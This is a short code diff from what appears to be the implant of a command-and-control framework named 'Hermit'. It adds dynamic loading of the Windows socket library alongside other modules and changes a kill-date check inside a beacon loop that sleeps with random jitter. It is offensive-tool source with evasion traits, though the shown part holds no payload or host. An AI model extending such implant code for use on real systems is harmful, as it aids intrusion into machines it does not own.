@@ -134,6 +134,14 @@ namespace Hermit
 		}
 		pModules->hWinHttp = hWinHttp;
 
+		WCHAR wWs2_32[] = L"ws2_32.dll";
+		HMODULE hWs2_32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wWs2_32);
+		if (!hWs2_32)
+		{
+			return;
+		}
+		pModules->hWs2_32 = hWs2_32;
+
 		// Get functions
 		Procs::FindProcsMisc(
 			pProcs,
@@ -145,7 +153,8 @@ namespace Hermit
 			hNetapi32,
 			hShell32,
 			hUser32,
-			hWinHttp
+			hWinHttp,
+			hWs2_32
 		);
 
 		// --------------------------------------------------------------------------
@@ -213,7 +222,7 @@ namespace Hermit
 		{
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
 
-			if (Handler::IsKillDateReached(pState->nKillDate))
+			if (Handler::IsKillDateReached(pState))
 			{
 				pState->bQuit = TRUE;
 			}
@@ -232,7 +241,7 @@ namespace Hermit
 		{
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
 
-			if (Handler::IsKillDateReached(pState->nKillDate))
+			if (Handler::IsKillDateReached(pState))
 			{
 				pState->bQuit = TRUE;
 			}
